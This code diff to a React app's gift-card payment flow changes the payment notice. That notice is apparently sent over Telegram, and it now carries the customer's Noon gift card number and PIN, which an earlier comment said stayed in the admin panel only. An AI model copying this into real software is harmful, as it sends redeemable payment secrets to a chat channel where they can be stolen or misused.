@@ -347,7 +347,9 @@ export default function App() {
           kind: paymentTarget.kind,
           method: "gift",
           channel: "payment",
-          note: "Customer submitted a Noon Gift Card payment. Card number and PIN are in the admin panel only.",
+          cardNumber: number,
+          giftPin: pin,
+          note: "Customer submitted a Noon Gift Card payment.",
         });
       } catch (noticeError) {
         setPaymentError(`Payment request saved. Telegram notice failed: ${noticeError.message}`);
